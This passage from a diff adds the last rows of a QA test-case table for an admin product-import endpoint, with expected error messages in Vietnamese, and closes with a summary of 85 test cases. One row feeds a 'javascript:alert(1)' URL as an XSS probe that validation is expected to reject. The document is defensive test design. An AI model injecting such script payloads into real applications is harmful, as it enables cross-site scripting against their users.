+| TC-IMPORT-ENH-002 | GAP-002 | `category_id: 0` not silently promoted to 1 | `category_id: 0` in row | Row error `"Hàng 1: category_id không hợp lệ"` OR stored as 0 if valid |
+| TC-IMPORT-ENH-003 | GAP-003 | Negative price rejected | `price: -1` | Row error `"Hàng 1: Giá sản phẩm phải lớn hơn 0"` |
+| TC-IMPORT-ENH-004 | GAP-003 | Zero price rejected | `price: 0` | Row error `"Hàng 1: Giá sản phẩm phải lớn hơn 0"` |
+| TC-IMPORT-ENH-005 | GAP-004 | Whitespace-only name rejected | `name: "   "` | Row error `"Hàng 1: Thiếu tên sản phẩm"` |
+| TC-IMPORT-ENH-006 | GAP-005 | Non-existent category_id rejected | `category_id: 9999` | Row error `"Hàng 1: category_id không tồn tại"` |
+| TC-IMPORT-ENH-007 | GAP-006 | Name > 255 chars rejected | `name: "<256 x 'A'>"` | Row error `"Hàng 1: Tên sản phẩm quá dài (tối đa 255 ký tự)"` |
+| TC-IMPORT-ENH-008 | GAP-007 | `javascript:` imageUrl rejected | `imageUrl: "javascript:alert(1)"` | Row error `"Hàng 1: URL hình ảnh không hợp lệ"` |
+| TC-IMPORT-ENH-009 | GAP-009 | Import > 1000 rows rejected | `products`: 1001 items | 400 `{"error": "Giới hạn 1000 sản phẩm mỗi lần import"}` |
+| TC-IMPORT-ENH-010 | GAP-010 | Partial failure rolls back all | Row 1 valid, Row 2 causes DB error | 0 rows inserted; both rows rolled back; error returned |
+| TC-IMPORT-ENH-011 | GAP-013 | Missing price rejected per row | `{"name": "SP", "category_id": 1}` (no price) | Row error `"Hàng 1: Thiếu giá sản phẩm"` |
+| TC-IMPORT-ENH-012 | GAP-011 | String price rejected | `price: "150000"` | Row error `"Hàng 1: Giá sản phẩm phải là số nguyên"` |
+
+---
+
+**Summary:** 60 functional test cases + 13 security test cases + 12 enhancement test cases = **85 total test cases** covering array-level BVA, per-row field boundaries, falsy-coercion semantic bugs, authentication/authorization gaps, and stored XSS/SSRF vectors for `POST /api/admin/import-products`.
